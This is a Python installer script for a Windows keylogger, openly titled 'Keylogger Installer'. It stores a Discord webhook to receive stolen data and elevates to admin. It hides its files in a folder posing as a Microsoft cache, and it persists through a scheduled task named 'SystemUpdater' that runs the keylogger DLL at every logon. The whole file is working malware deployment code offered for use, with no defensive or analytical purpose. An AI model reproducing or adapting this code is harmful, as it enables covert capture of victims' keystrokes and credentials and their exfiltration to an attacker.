import os
import sys
import shutil
import ctypes
import base64
import subprocess
import msvcrt

# === Config ===
TARGET_DIR = r"C:\ProgramData\Microsoft\CacheSync"
WEBHOOK_FILE = "cache.db"
DLL_NAME = "update.dll"
EXE_NAME = "systemupdater.exe"
TASK_NAME = "SystemUpdater"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def restart_as_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, __file__, None, 1)
        sys.exit()

def encode_webhook_to_file():
    webhook = input("Enter your Discord Webhook URL:\n> ").strip()
    if not webhook.startswith("http"):
        print("[X] Invalid webhook URL. Exiting.")
        wait_exit()
    encoded = base64.b64encode(webhook.encode()).decode()
    with open(WEBHOOK_FILE, "w", encoding="utf-8") as f:
        f.write(encoded)
    print(f"[OK] Webhook saved to {WEBHOOK_FILE}")

def copy_files():
    os.makedirs(TARGET_DIR, exist_ok=True)
    subprocess.call(["attrib", "+h", TARGET_DIR])
    for fname in [EXE_NAME, DLL_NAME, WEBHOOK_FILE]:
        if os.path.exists(fname):
            shutil.copy2(fname, os.path.join(TARGET_DIR, fname))
            print(f"[OK] {fname} copied.")
        else:
            print(f"[X] {fname} NOT found!")

def setup_autostart():
    dll_path = os.path.join(TARGET_DIR, DLL_NAME)
    cmd = [
        "schtasks", "/Create", "/F",
        "/TN", TASK_NAME,
        "/TR", f'rundll32.exe "{dll_path}",MyFunction',
        "/SC", "ONLOGON",
        "/RL", "LIMITED"
    ]
    result = subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if result.returncode == 0:
        print(f"[OK] Autostart task '{TASK_NAME}' created.")
    else:
        print(f"[X] Failed to create scheduled task.")

def start_keylogger_now():
    dll_path = os.path.join(TARGET_DIR, DLL_NAME)
    print("\n[STEP] Starting keylogger...")
    try:
        subprocess.Popen(["rundll32.exe", f"{dll_path},MyFunction"], shell=False)
        print("[OK] Keylogger started via DLL.")
    except Exception as e:
        print(f"[X] Failed to start keylogger: {e}")

def wait_exit():
    print("\nPress any key to exit...")
    msvcrt.getch()
    sys.exit()

if __name__ == "__main__":
    restart_as_admin()
    print("=== Keylogger Installer ===\n")
    encode_webhook_to_file()
    print("\n[STEP] Copying files...")
    copy_files()
    print("\n[STEP] Setting up autostart...")
    setup_autostart()
    start_keylogger_now()
    print("\n[✓] Setup complete.")
    wait_exit()
